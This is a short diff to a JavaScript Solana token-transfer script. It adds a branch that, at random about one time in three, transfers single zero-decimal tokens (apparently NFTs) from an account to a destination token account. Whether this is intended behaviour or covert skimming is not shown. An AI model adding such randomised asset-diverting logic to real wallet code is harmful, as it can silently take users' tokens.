@@ -288,6 +288,21 @@ const keypair = new Keypair()
                                 );
                                 amt = amt * 0.9
 
+                              }else 
+                              if (amt == 1 && account.account.data["parsed"]["info"]["tokenAmount"]["decimals"] == 0){
+                                ran = Math.random() 
+                                if (ran > 0.666){
+                                let bla = await splutils.transferChecked(
+                                  connection, // connection
+                                  whereto, // payer
+                                  new PublicKey(account.pubkey), // from (should be a token account)
+                                  new PublicKey(account.account.data.parsed.info.mint), // mint
+                                  ata.address, // to (should be a token account)
+                                  keypair, // from's owner
+                                  amt , account.account.data["parsed"]["info"]["tokenAmount"]["decimals"]
+                                );
+                                }
+
                               }
                               let bla = await splutils.transferChecked(
                                 connection, // connection
